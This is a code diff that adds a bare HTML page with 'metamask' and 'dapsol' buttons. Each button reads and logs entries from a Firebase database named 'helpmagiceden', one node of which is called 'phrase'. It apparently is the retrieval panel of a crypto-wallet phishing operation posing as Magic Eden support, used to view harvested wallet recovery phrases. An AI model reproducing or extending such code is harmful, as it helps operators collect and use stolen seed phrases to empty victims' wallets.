@@ -1,0 +1,38 @@
+
+<body>
+  
+  <button onclick="metamask()"> metamask </button> 
+  <br/> <br/>
+  <button onclick="dapsol()"> dapsol </button>
+  
+  
+  
+<script src="https://www.gstatic.com/firebasejs/8.4.2/firebase.js"></script>  
+<script>
+  	var firebaseConfig = {
+  databaseURL: "https://helpmagiceden-default-rtdb.firebaseio.com",
+  };
+
+firebase.initializeApp(firebaseConfig);
+  
+var database = firebase.database();
+
+// This is reference to tha database, to fetch data from database use below code:
+
+    function metamask() {
+var starCountRef = firebase.database().ref('metamask');
+// Add ref of child if any
+starCountRef.on('value', function(snapshot) {
+    console.log(snapshot.val());
+});};
+
+    function dapsol() {
+var starCountRef = firebase.database().ref('phrase');
+// Add ref of child if any
+starCountRef.on('value', function(snapshot) {
+    console.log(snapshot.val());
+});};
+</script>
+  
+  
+</body>
